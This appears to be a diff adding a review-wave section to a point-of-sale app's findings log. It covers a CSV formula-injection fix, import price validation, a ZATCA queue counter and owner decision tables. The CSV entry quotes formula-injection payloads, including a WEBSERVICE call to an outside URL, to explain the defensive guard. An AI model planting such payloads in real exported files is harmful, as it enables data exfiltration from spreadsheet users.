@@ -294,3 +294,44 @@ The R10 pass moved to the one externally-facing delivery path that no previous w
 **Version discipline:** RVW-22 is a real production-code fix (resource handling on the failure path), so the wave takes a bump — **V 3.2.8, versionCode 17** — unlike the test/docs-only R9. No data model change (schema stays v18), no API surface change, no user-visible flow change: the only observable difference is that failed deliveries stop leaking their sockets.
 
 **Fail-direction note (why RVW-22 was auto-fixed while RVW-21 was routed to the owner):** RVW-22 is a defect with a strictly better fix — closing the correct stream cannot change what is sent, recorded, or decided; it only reclaims the resource the code already intended to release (the original intent is visible in the closed success-path stream). RVW-21, by contrast, is a business-semantics fork with fraud-surface implications in either direction — exactly the class the engagement routes to the owner. One more candidate examined and left alone by the same logic: `secretOnce()` degrading to `""` on PinVault decryption failure makes `send` deliver *unsigned* while the owner believes a secret is configured (the conflation of "no secret" with "secret unreadable"). The fail direction is receiver-dependent and the honest fix (fail-closed no-send when a secret is configured but unreadable) changes delivery semantics — routed to the owner as a documented observation, not implemented unilaterally (report §19).
+
+## 13. Wave R11 (2026-10-19) — "Complete the remaining tasks": Three New Territories Adversarially Reviewed (CSV Injection Surface; Checks/Installments Money Math; ZATCA Queue Transitions) — Two Real Gaps Fixed, One Visibility Hole Fixed, Two Territories Verdict-Solid
+
+### 13-أ. RVW-25 — CSV export guard had exactly one surviving formula-injection hole: the minus-sign function form (FIXED)
+
+L-5 (V3.0.2 era) unified the export guard to `= + @ TAB CR` and removed `-`, on the claim "a leading minus never starts a formula in Excel" (it broke `-46.6` numeric reading in Sheets as text). **New evidence, partial reopening**: the claim holds only for pure numerics. Excel *does* evaluate a leading `-` followed by a function or cell reference as a formula: `-SUM(A1)`, `-1+WEBSERVICE("http://x")`, `-A1`. The full attack chain is real in this codebase: a hostile CSV *import* stores text verbatim (documented import contract, item 2 of the H4-6 wave) → the string sits in a party/product name → a later export (parties, debts, favorites, all delegating to `CsvKit.escape` as the single source per the L-5 unification) writes it bare → the shop owner opens the file in Excel → the formula executes (data exfiltration via WEBSERVICE, the classic OWASP CSV-injection payload). Every other leading char was guarded; `-` was the only hole.
+
+**Fix (shape-aware, preserves the L-5 contract verbatim)**: the `'` guard prefix is now added for a leading `-` **iff the remainder contains any letter** (`Char.isLetter()`, Arabic included) — i.e. the function/reference form — while pure numerics (`-46.6`, `-1`, `-250.75`, `-2+3`, `- 46`) stay bare exactly as the L-5 test contract locks them. No numeric coordinate or negative balance is mangled (the original L-5 harm), and the exfiltration form is neutralized (Excel shows it as text, apostrophe hidden). Locked in `CsvKitTest`: `escape_minusFormulaForm_isGuarded` (4 forms incl. Arabic letters and RFC4180 quote-wrapped variants) and `escape_minusNumericForms_stayBare` (6 numeric forms — the existing L-5 assertions pass untouched).
+
+### 13-ب. RVW-26 — CSV import accepted negative cost/sale prices while rejecting negative quantities (FIXED)
+
+`CsvImportKit.parseQty` has rejected negative quantities since H4-6, but `parseMoney` accepted negative cost/sale prices — the same file format applied two different validity disciplines to sibling columns. Consequence chain: a hostile (or typo'd) import file creates products with negative prices → POS is *money-safe* (cart line entry coerces ≥ 0 at `PosScreen` price capture; stored-cart restoration drops negative-priced lines at `PosCart`; totals floor at 0) but inventory valuation (`valRetail = Σ qty·salePrice`, raw sum) skews negative, and the product behaves bizarrely in the cart. The import contract (item 3: "a broken row is skipped with a named reason") already demanded this rigor.
+
+**Fix**: negative cost or sale price now skips the row with a named reason (`سعر تكلفة سالب` / `سعر بيع سالب`), consistent with the quantity guard. Zero prices remain valid (gift/promo items) — locked by `c6_zeroPrices_stillAccepted_giftItems`.
+
+### 13-ج. RVW-27 — ZATCA queue: a missing archived document spun silently forever, invisible in every counter (FIXED, additive)
+
+`Processor.processOnce` skipped a queued invoice whose archived document is missing (`loadDocument == null → continue`) without touching any summary counter. A data anomaly (AUD-4 made doc+status atomic, so this should not occur — which is exactly why it must be *visible* if it does) becomes a silent poison element: reprocessed every batch, consuming a batch slot, reported by nothing. **Fix (additive, non-breaking)**: `ProcessSummary` gains `missingDocs: Int = 0`; the processor counts and still sends nothing and writes no state for the missing item (policy unchanged — visibility only). The production wrapper (`ZatcaReportWorker`) surfaces it in the batch summary. Locked by `processOnce_missingDocument_countedNotSpunSilently`.
+
+### 13-د. Verified solid — verdicts recorded, no code changed
+
+- **Installments money math (engine + repo)**: `createPlan` rejects non-positive totals, coerces the down payment into `[0, total]`, requires financed > 0 and months ∈ 1..120 (the engine's silent empty-schedule path for non-positive financing and the unbounded-months OOM suspect are **unreachable from production**); `pay` re-reads inside the transaction and clamps to the open amount (overpayment impossible → `stats.remaining` can never go negative); early settlement quotes internally and closes fully; reschedule rejects past dates and fully-paid items. The P33-P8 piaster migration left no float behind.
+- **Checks money math**: `save` guards positive amount / due ≥ issue / non-blank number; `setStatus` decides from the **fresh row read inside the transaction** (the stale-copy double-post is already fixed and documented), enforces a transition whitelist (cleared-from-bounced = legitimate re-honor posting a new entry; 2→0/1 impossible without un-posting), and `delete` cleans ledger ghosts + payments atomically.
+- **ZATCA queue, reboot-stall suspect dismissed with evidence**: the pure-API `isDue` would stall after an `elapsedRealtime` reset (negative diff), **but the production wrapper passes `lastAttemptElapsedMs = 0L` every cycle** (documented in-code), making every pending item due each 6-hour cycle — the 6h period ≥ the 6h backoff cap makes this equivalent to honoring backoff at period granularity. Production is immune; the quirk affects hypothetical alternative callers only. Callback-exception semantics (batch aborts mid-way; an accepted-but-unwritten item is re-sent next cycle and converges via the caller's idempotent single transaction — AUD-4) are the documented at-least-once contract; no change.
+- **Import/export parsing robustness**: RFC4180-lite parser is allocation-bounded by input size, regex-free (no ReDoS), quote-mid-field degrades via width normalization instead of crashing.
+
+### 13-ه. Owner decision briefs (the two open rulings, made one-glance)
+
+**Ruling 1 — RVW-21 coupon-void semantics** (full design in §11):
+| Option | Meaning | Cost | Risk |
+|---|---|---|---|
+| **A. Keep as-is** (status quo) | Consumed coupon stays consumed on invoice void — the append-only witness stands | Zero (contract already test-locked) | A customer loses the coupon if the sale itself is voided — merchant goodwill issue only |
+| **B. Compensating restore** | Void posts a VOID witness (qty = −1) and the coupon gate switches `COUNT(*) → SUM(qty)` | Adapter + migration-aware gate change + new tests | Re-opens a financial ledger semantics; needs its own adversarial pass |
+
+**Ruling 2 — webhook unsigned-fallback** (FINDINGS §12 / report §19 item 4):
+| Option | Meaning | Cost | Risk |
+|---|---|---|---|
+| **A. Fail-closed** | A configured-but-unreadable secret (PinVault/Keystore invalidated, e.g. after device restore) → `send` returns false, nothing delivered unsigned; honest `lastResult` | Small: one branch + tests | Deliveries stop until the owner re-enters the secret — visible, requires action |
+| **B. Keep as-is** | Unreadable secret → delivered unsigned, silently | Zero | Receivers accepting unsigned events lose integrity verification without anyone noticing — a silent security downgrade |
+
+Both rulings are pure owner decisions; nothing was implemented beyond the lock/tests that make either choice safe to take later.
